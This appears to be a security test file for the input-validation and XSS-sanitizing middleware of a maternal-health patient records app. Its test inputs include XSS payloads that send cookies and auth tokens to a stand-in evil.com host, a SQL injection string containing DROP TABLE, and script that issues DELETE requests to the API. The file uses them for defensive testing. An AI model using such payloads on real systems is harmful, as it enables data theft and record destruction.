// Middleware validation and integration tests
import request from 'supertest';
import express from 'express';
import { validate } from '../server/validation/middleware';
import { patientSchema, ancRecordSchema } from '../server/validation/patient';
import { xssClean } from '../server/utils/xssClean';

// Create test Express app
const createTestApp = () => {
  const app = express();
  app.use(express.json());
  
  // Patient validation endpoint
  app.post('/test-patient', 
    xssClean(), 
    validate(patientSchema), 
    (req, res) => {
      res.json({ success: true, data: req.body });
    }
  );
  
  // ANC validation endpoint
  app.post('/test-anc', 
    xssClean(), 
    validate(ancRecordSchema), 
    (req, res) => {
      res.json({ success: true, data: req.body });
    }
  );
  
  return app;
};

describe('Validation Middleware Integration', () => {
  let app: express.Application;
  
  beforeEach(() => {
    app = createTestApp();
  });

  describe('Patient Validation', () => {
    test('should return 400 for invalid NRC format', async () => {
      const response = await request(app)
        .post('/test-patient')
        .send({
          firstName: 'John',
          surname: 'Doe',
          dateOfBirth: '1990-01-01',
          sex: 'Male',
          nrc: '12345/12/1', // Invalid format - missing digit
          facility: 'Chamakubi Health Post',
          mothersName: 'Mary',
          mothersSurname: 'Doe'
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Validation failed');
      expect(response.body.details).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            path: expect.arrayContaining(['nrc']),
            message: expect.stringContaining('NRC')
          })
        ])
      );
    });

    test('should return 400 for invalid phone number format', async () => {
      const response = await request(app)
        .post('/test-patient')
        .send({
          firstName: 'Jane',
          surname: 'Smith',
          dateOfBirth: '1990-01-01',
          sex: 'Female',
          cellphoneNumber: '123456789', // Invalid format
          facility: 'Chamakubi Health Post',
          mothersName: 'Alice',
          mothersSurname: 'Smith'
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Validation failed');
    });

    test('should pass validation for valid patient data', async () => {
      const validPatient = {
        firstName: 'John',
        surname: 'Doe',
        dateOfBirth: '1990-01-01',
        sex: 'Male',
        nrc: '123456/12/1',
        cellphoneNumber: '0977123456',
        facility: 'Chamakubi Health Post',
        mothersName: 'Mary',
        mothersSurname: 'Doe'
      };

      const response = await request(app)
        .post('/test-patient')
        .send(validPatient);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.data.firstName).toBe('John');
    });

    test('should sanitize XSS in patient data while validating', async () => {
      const maliciousPatient = {
        firstName: '<script>alert("xss")</script>John',
        surname: '<img src=x onerror=alert("xss")>Doe',
        dateOfBirth: '1990-01-01',
        sex: 'Male',
        nrc: '123456/12/1',
        facility: 'Chamakubi Health Post',
        mothersName: 'Mary',
        mothersSurname: 'Doe'
      };

      const response = await request(app)
        .post('/test-patient')
        .send(maliciousPatient);

      expect(response.status).toBe(200);
      expect(response.body.data.firstName).not.toContain('<script>');
      expect(response.body.data.firstName).toContain('John');
      expect(response.body.data.surname).not.toContain('<img');
      expect(response.body.data.surname).toContain('Doe');
    });
  });

  describe('ANC Record Validation', () => {
    test('should reject extremely high blood pressure', async () => {
      const response = await request(app)
        .post('/test-anc')
        .send({
          patientId: 1,
          visitType: 'routine',
          gestationalAge: 20,
          bloodPressureSystolic1: 300, // Too high
          bloodPressureDiastolic1: 80,
          temperatureFirst: 370
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Validation failed');
    });

    test('should reject invalid gestational age', async () => {
      const response = await request(app)
        .post('/test-anc')
        .send({
          patientId: 1,
          visitType: 'routine',
          gestationalAge: 50, // Too high
          bloodPressureSystolic1: 120,
          bloodPressureDiastolic1: 80
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Validation failed');
    });

    test('should pass validation for valid ANC data', async () => {
      const validANC = {
        patientId: 1,
        visitType: 'routine',
        gestationalAge: 20,
        bloodPressureSystolic1: 120,
        bloodPressureDiastolic1: 80,
        temperatureFirst: 370,
        pulseRateFirst: 72,
        respiratoryRateFirst: 18
      };

      const response = await request(app)
        .post('/test-anc')
        .send(validANC);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.data.gestationalAge).toBe(20);
    });

    test('should sanitize XSS in ANC clinical notes', async () => {
      const maliciousANC = {
        patientId: 1,
        visitType: 'routine',
        gestationalAge: 20,
        bloodPressureSystolic1: 120,
        bloodPressureDiastolic1: 80,
        clinicalNotes: '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>Patient doing well',
        symptoms: '<img src=x onerror=alert("Medical data breach")>Mild headache'
      };

      const response = await request(app)
        .post('/test-anc')
        .send(maliciousANC);

      expect(response.status).toBe(200);
      expect(response.body.data.clinicalNotes).not.toContain('<script>');
      expect(response.body.data.clinicalNotes).toContain('Patient doing well');
      expect(response.body.data.symptoms).not.toContain('<img');
      expect(response.body.data.symptoms).toContain('Mild headache');
    });
  });

  describe('Combined Security Validation', () => {
    test('should handle complex nested XSS attacks with validation errors', async () => {
      const maliciousData = {
        firstName: '<svg onload=alert("First Name XSS")>John',
        surname: '<iframe src="javascript:alert(\'Surname XSS\')"></iframe>',
        dateOfBirth: '1990-01-01',
        sex: 'Male',
        nrc: '12345/12/1', // Invalid format
        cellphoneNumber: '<script>location.href="http://evil.com"</script>0977123456',
        facility: 'Chamakubi Health Post',
        mothersName: '<style>body{display:none}</style>Mary',
        mothersSurname: 'Doe'
      };

      const response = await request(app)
        .post('/test-patient')
        .send(maliciousData);

      // Should return validation error due to invalid NRC
      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Validation failed');
      
      // But the malicious content should still be sanitized in the error response
      if (response.body.receivedData) {
        expect(response.body.receivedData.firstName).not.toContain('<svg');
        expect(response.body.receivedData.surname).not.toContain('<iframe');
        expect(response.body.receivedData.cellphoneNumber).not.toContain('<script>');
        expect(response.body.receivedData.mothersName).not.toContain('<style>');
      }
    });

    test('should protect against SQL injection attempts in healthcare data', async () => {
      const sqlInjectionData = {
        firstName: "John'; DROP TABLE patients; --",
        surname: "Doe",
        dateOfBirth: '1990-01-01',
        sex: 'Male',
        nrc: '123456/12/1',
        facility: 'Chamakubi Health Post',
        mothersName: "Mary",
        mothersSurname: "Smith"
      };

      const response = await request(app)
        .post('/test-patient')
        .send(sqlInjectionData);

      expect(response.status).toBe(200);
      // SQL injection should be treated as regular text after sanitization
      expect(response.body.data.firstName).toContain('John');
      expect(response.body.data.firstName).not.toContain('DROP TABLE');
    });

    test('should handle healthcare-specific attack vectors', async () => {
      const healthcareAttack = {
        patientId: 1,
        visitType: 'routine',
        gestationalAge: 20,
        bloodPressureSystolic1: 120,
        bloodPressureDiastolic1: 80,
        medications: '<script>fetch("/api/patients", {method:"DELETE"})</script>Paracetamol',
        allergies: '<img src=x onerror=fetch("/api/admin/users")>None known',
        medicalHistory: '<svg onload=document.location="http://evil.com/exfiltrate?data="+btoa(localStorage.getItem("authToken"))>Diabetes',
        emergencyContact: '<iframe src="javascript:alert(document.cookie)"></iframe>0977654321'
      };

      const response = await request(app)
        .post('/test-anc')
        .send(healthcareAttack);

      expect(response.status).toBe(200);
      expect(response.body.data.medications).not.toContain('<script>');
      expect(response.body.data.medications).toContain('Paracetamol');
      expect(response.body.data.allergies).not.toContain('<img');
      expect(response.body.data.allergies).toContain('None known');
      expect(response.body.data.medicalHistory).not.toContain('<svg');
      expect(response.body.data.medicalHistory).toContain('Diabetes');
      expect(response.body.data.emergencyContact).not.toContain('<iframe');
      expect(response.body.data.emergencyContact).toContain('0977654321');
    });
  });
});